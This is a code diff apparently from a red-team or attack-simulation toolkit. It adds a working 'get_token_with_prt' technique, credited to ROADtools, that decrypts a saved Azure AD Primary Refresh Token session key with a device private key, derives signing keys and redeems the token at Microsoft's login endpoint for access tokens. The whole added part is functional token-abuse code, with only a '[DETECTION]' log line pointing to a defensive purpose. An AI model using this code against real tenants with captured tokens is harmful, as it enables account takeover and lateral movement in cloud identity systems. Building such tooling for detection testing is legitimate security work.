@@ -1,6 +1,7 @@
 import base64
 import json
 import logging
+import os
 import struct
 import time
 import uuid
@@ -8,10 +9,15 @@ from datetime import datetime, timedelta
 
 import requests
 from cryptography import x509
-from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives import hashes, serialization, padding
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
 from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, Mode, CounterLocation
+from cryptography.hazmat.primitives.asymmetric import padding as apadding
+from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, Mode, CounterLocation
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes as cipher_modes
 import jwt
 
 BCRYPT_RSAPUBLIC_MAGIC = 0x31415352  # 'RSA1'
@@ -287,8 +293,6 @@ def request_prt(params):
 
 	except Exception as e:
 		logging.error(f"Failed to create device JWT: {e}")
-		import traceback
-		logging.error(traceback.format_exc())
 		return
 
 	# STEP 3: Submit signed JWT to get PRT
@@ -363,4 +367,348 @@ def request_prt(params):
 
 	except Exception as e:
 		logging.error(f"Failed to write PRT output to {prt_out}: {e}")
+		return
+
+def _calculate_derived_key_v2(session_key, context, jwtbody):
+	"""
+	Derive a key from PRT session key using context and JWT body.
+	Based on ROADtools calculate_derived_key_v2
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1280
+	"""
+
+	digest = hashes.Hash(hashes.SHA256())
+	digest.update(context)
+	digest.update(jwtbody)
+	kdfcontext = digest.finalize()
+
+	label = b"AzureAD-SecureConversation"
+	kdf = KBKDFHMAC(
+		algorithm=hashes.SHA256(),
+		mode=Mode.CounterMode,
+		length=32,
+		rlen=4,
+		llen=4,
+		location=CounterLocation.BeforeFixed,
+		label=label,
+		context=kdfcontext,
+		fixed=None,
+		backend=default_backend()
+	)
+	return kdf.derive(session_key)
+
+
+def _calculate_derived_key_v1(session_key, context):
+	"""
+	Derive key using v1 (without JWT body).
+	Based on ROADtools calculate_derived_key:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1291
+	"""
+	
+
+	label = b"AzureAD-SecureConversation"
+	kdf = KBKDFHMAC(
+		algorithm=hashes.SHA256(),
+		mode=Mode.CounterMode,
+		length=32,
+		rlen=4,
+		llen=4,
+		location=CounterLocation.BeforeFixed,
+		label=label,
+		context=context,
+		fixed=None,
+		backend=default_backend()
+	)
+	return kdf.derive(session_key)
+
+
+def _decrypt_response_with_derived_key(encrypted_response, session_key):
+	"""
+	Decrypt encrypted authentication response (JWE format).
+	Handles both AES-256-GCM (12-byte IV) and AES-256-CBC (16-byte IV) based on IV length.
+	Based on ROADtools auth.py decrypt_auth_response and decrypt_auth_response_derivedkey:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1314
+	"""
+	
+
+	try:
+		def b64_decode(data):
+			return base64.urlsafe_b64decode(data + ('=' * (len(data) % 4)))
+
+		# Split JWE into 5 parts: header.enckey.iv.ciphertext.authtag
+		parts = encrypted_response.split('.')
+		if len(parts) != 5:
+			logging.error(f"Invalid JWE format: expected 5 parts, got {len(parts)}")
+			return None
+
+		header_b64, _, iv_b64, ciphertext_b64, authtag_b64 = parts
+
+		# Parse header and extract context
+		header = json.loads(b64_decode(header_b64))
+		if 'ctx' not in header:
+			logging.error("No 'ctx' in JWE header")
+			return None
+
+		context = b64_decode(header['ctx'])
+		derived_key = _calculate_derived_key_v1(session_key, context)
+
+		# Decode JWE components
+		iv = b64_decode(iv_b64)
+		ciphertext = b64_decode(ciphertext_b64)
+		authtag = b64_decode(authtag_b64)
+
+		# Decrypt based on IV length
+		if len(iv) == 12:
+			# AES-256-GCM (12-byte nonce)
+			aesgcm = AESGCM(derived_key)
+			plaintext = aesgcm.decrypt(iv, ciphertext + authtag, header_b64.encode('utf-8'))
+		else:
+			# AES-256-CBC with PKCS7 padding (typical for Azure)
+			
+			cipher = Cipher(algorithms.AES(derived_key), cipher_modes.CBC(iv))
+			decryptor = cipher.decryptor()
+			decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
+			unpadder = padding.PKCS7(128).unpadder()
+			plaintext = unpadder.update(decrypted_data) + unpadder.finalize()
+
+		return plaintext.decode('utf-8')
+
+	except Exception as e:
+		logging.error(f"Failed to decrypt response: {e}")
+		return None
+
+
+def _decrypt_jwe_with_private_key(jwe_token, private_key):
+	"""
+	Decrypt JWE session_key using device certificate private key (RSA-OAEP).
+	Based on ROADtools decrypt_jwe_with_transport_key:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L757
+	"""
+	try:
+		dataparts = jwe_token.split('.')
+		if len(dataparts) < 2:
+			logging.error("Invalid JWE format")
+			return None
+
+		wrapped_key_b64 = dataparts[1]
+		wrapped_key_b64 += '=' * ((4 - len(wrapped_key_b64) % 4) % 4)
+		wrapped_key = base64.urlsafe_b64decode(wrapped_key_b64)
+
+		unwrapped_key = private_key.decrypt(
+			wrapped_key,
+			apadding.OAEP(
+				mgf=apadding.MGF1(algorithm=hashes.SHA1()),
+				algorithm=hashes.SHA1(),
+				label=None
+			)
+		)
+		return unwrapped_key
+
+	except Exception as e:
+		logging.error(f"Failed to decrypt JWE: {e}")
+		return None
+
+
+def get_token_with_prt(params):
+	"""
+	Use a saved PRT to obtain an access token for a specific resource/client.
+
+	This implements the ROADtools aad_brokerplugin_prt_auth pattern:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L1037
+
+	1. Load PRT from disk
+	2. Decrypt session_key_jwe using device certificate private key
+	3. Get nonce from srv_challenge
+	4. Create JWT payload signed with derived key
+	5. Submit to token endpoint
+	6. Decrypt response to extract access token
+
+	Parameters:
+		prt_file: Path to saved PRT file (from request_prt)
+		key_path: Path to device private key
+		cert_path: Path to device certificate
+		client_id: Client ID to request token for
+		resource: Resource/scope to request access to
+		tenant_id: Tenant ID
+		token_out: Output file for token (optional)
+	"""
+	logging.info("Running the get_token_with_prt technique")
+
+	prt_file = params.get("prt_file")
+	key_path = params.get("key_path")
+	cert_path = params.get("cert_path")
+	client_id = params.get("client_id")
+	resource = params.get("resource")
+	tenant_id = params.get("tenant_id", "common")
+	token_out = params.get("token_out", "token_with_prt.json")
+
+	if not all([prt_file, key_path, cert_path, client_id, resource]):
+		logging.error("prt_file, key_path, cert_path, client_id, and resource parameters are required")
+		return
+
+	# Step 1: Load PRT and device key from disk
+	try:
+		with open(prt_file, "r") as f:
+			prt_data = json.load(f)
+		prt = prt_data.get("refresh_token")
+		session_key_jwe = prt_data.get("session_key_jwe")
+
+		if not prt or not session_key_jwe:
+			logging.error("PRT file missing refresh_token or session_key_jwe")
+			return
+
+		logging.info(f"Loaded PRT from {prt_file}")
+	except Exception as e:
+		logging.error(f"Failed to load PRT: {e}")
+		return
+
+	# Load device private key for JWE decryption
+	try:
+		with open(key_path, "rb") as f:
+			private_key_pem = f.read()
+		private_key = serialization.load_pem_private_key(
+			private_key_pem,
+			password=None,
+			backend=default_backend()
+		)
+	except Exception as e:
+		logging.error(f"Failed to load device private key: {e}")
+		return
+
+	# Step 2: Decrypt session_key_jwe to get the actual session key
+	session_key = _decrypt_jwe_with_private_key(session_key_jwe, private_key)
+	if not session_key:
+		logging.error("Failed to decrypt session key")
+		return
+
+	# Step 3: Request nonce from srv_challenge
+	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
+	headers = {
+		"Content-Type": "application/x-www-form-urlencoded",
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+	}
+
+	nonce_body = {
+		"grant_type": "srv_challenge",
+		"windows_api_version": "2.0",
+		"client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
+	}
+
+	try:
+		nonce_response = requests.post(token_endpoint, headers=headers, data=nonce_body, timeout=10)
+		if nonce_response.status_code != 200:
+			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
+			return
+
+		nonce_data = nonce_response.json()
+		nonce = nonce_data.get("Nonce")
+		if not nonce:
+			logging.error("No nonce received")
+			return
+
+	except Exception as e:
+		logging.error(f"Exception during nonce request: {e}")
+		return
+
+	# Step 4: Create JWT payload signed with derived key
+	now = int(time.time())
+	jwt_payload = {
+		"client_id": client_id,
+		"request_nonce": nonce,
+		"scope": "openid",
+		"resource": resource,
+		"grant_type": "refresh_token",
+		"refresh_token": prt,
+		"win_ver": "10.0.19041.868",
+		"aud": "login.microsoftonline.com",
+		"iss": "aad:brokerplugin",
+		"iat": now,
+		"exp": now + 3600,
+	}
+
+	# Create temp JWT to extract body for KDF
+	jwt_context = os.urandom(24)
+	headers_for_temp = {
+		'ctx': base64.b64encode(jwt_context).decode('utf-8'),
+		'kdf_ver': 2
+	}
+
+	try:
+		temp_jwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=headers_for_temp)
+		jbody = temp_jwt.split('.')[1]
+		jwtbody = base64.urlsafe_b64decode(jbody + ('=' * (len(jbody) % 4)))
+
+		derived_key = _calculate_derived_key_v2(session_key, jwt_context, jwtbody)
+		request_jwt = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=headers_for_temp)
+
+	except Exception as e:
+		logging.error(f"Failed to create/sign JWT: {e}")
+		return
+
+	# Step 5: Submit signed JWT to token endpoint
+	token_body = {
+		'windows_api_version': '2.2',
+		'grant_type': 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+		'request': request_jwt,
+		'client_info': '1'
+	}
+
+	try:
+		token_response = requests.post(token_endpoint, headers=headers, data=token_body, timeout=10)
+
+		if token_response.status_code not in (200, 201):
+			logging.error(f"Token request failed: {token_response.status_code}")
+			try:
+				error_data = token_response.json()
+				logging.error(f"Error: {error_data.get('error')}")
+				logging.error(f"Description: {error_data.get('error_description')}")
+			except:
+				logging.error(f"Response: {token_response.text[:200]}")
+			return
+
+		response_text = token_response.text
+
+		# Step 6: Decrypt response using session key
+		plaintext = _decrypt_response_with_derived_key(response_text, session_key)
+		if not plaintext:
+			logging.error("Failed to decrypt response")
+			return
+
+		# Step 7: Parse decrypted response and extract tokens
+		try:
+			response_data = json.loads(plaintext)
+		except Exception as e:
+			logging.error(f"Failed to parse decrypted response as JSON: {e}")
+			return
+
+		# Extract tokens from response
+		output = {
+			"status": "✓ Token request successful",
+			"client_id": client_id,
+			"resource": resource,
+			"response_keys": list(response_data.keys()),
+		}
+
+		# Extract access token
+		if 'access_token' in response_data:
+			output["access_token"] = response_data['access_token']
+			logging.info(f"✓ ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")
+
+		# Extract other useful tokens
+		for key in ['refresh_token', 'id_token', 'expires_in']:
+			if key in response_data:
+				if key == 'refresh_token':
+					output[key] = response_data[key][:50] + "..." if len(response_data[key]) > 50 else response_data[key]
+				else:
+					output[key] = response_data[key]
+
+		with open(token_out, "w") as f:
+			json.dump(output, f, indent=2)
+
+		logging.info(f"Token response saved to {token_out}")
+		logging.info(f"[DETECTION] Used PRT for {client_id} to request {resource}")
+
+		return output
+
+	except Exception as e:
+		logging.error(f"Exception during token request: {e}")
 		return
